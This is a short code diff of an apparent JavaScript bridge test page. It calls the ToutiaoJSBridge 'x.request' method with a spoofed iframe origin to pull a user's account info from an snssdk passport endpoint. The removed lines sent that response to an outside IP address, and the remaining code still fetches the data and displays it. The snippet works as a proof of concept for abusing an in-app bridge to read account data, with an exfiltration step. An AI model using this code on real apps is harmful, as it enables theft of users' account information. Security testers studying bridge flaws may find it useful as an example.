@@ -12,9 +12,6 @@ jsb test
     
     function callxrequest() {
         window.ToutiaoJSBridge.call("x.request", {"url":"https://is.snssdk.com/passport/account/info/v2/","__iframe_url":"https://www.baidu.com","method":"get","params":{},"data":{},"proto":"v2"}, function(args){
-            var xmlhttp=new XMLHttpRequest();
-            xmlhttp.open("GET","http://10.71.169.132/aa?ret="+JSON.stringify(args),true);
-            xmlhttp.send();
             alert(JSON.stringify(args));
         });
     }
